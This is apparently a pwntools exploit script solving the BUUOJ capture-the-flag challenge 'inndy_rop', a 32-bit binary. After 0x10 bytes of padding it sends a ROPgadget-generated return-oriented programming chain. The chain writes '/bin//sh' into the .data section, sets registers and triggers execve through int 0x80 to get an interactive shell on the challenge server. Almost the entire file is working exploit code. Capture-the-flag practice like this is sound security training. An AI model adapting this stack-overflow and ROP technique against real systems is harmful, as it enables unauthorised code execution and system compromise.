'''
@Author       : 白银
@Date         : 2023-05-16 08:52:30
@LastEditors  : 白银
@LastEditTime : 2023-05-16 08:56:58
@FilePath     : /pwn/inndy_rop.py
@Description  : https://buuoj.cn/challenges#inndy_rop
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *
from struct import pack

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './inndy_rop'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 25881)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.27x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x10 # ida看，var_C和r差多少

# ROPgadget --binary ./inndy_rop --ropchain
# Padding goes here
payload = b'a' * padding

payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea060) # @ .data
payload += pack('<I', 0x080b8016) # pop eax ; ret
payload += b'/bin'
payload += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea064) # @ .data + 4
payload += pack('<I', 0x080b8016) # pop eax ; ret
payload += b'//sh'
payload += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x080492d3) # xor eax, eax ; ret
payload += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080ea060) # @ .data
payload += pack('<I', 0x080de769) # pop ecx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x0806ecda) # pop edx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x080492d3) # xor eax, eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0807a66f) # inc eax ; ret
payload += pack('<I', 0x0806c943) # int 0x80

io.sendline(payload)

io.interactive()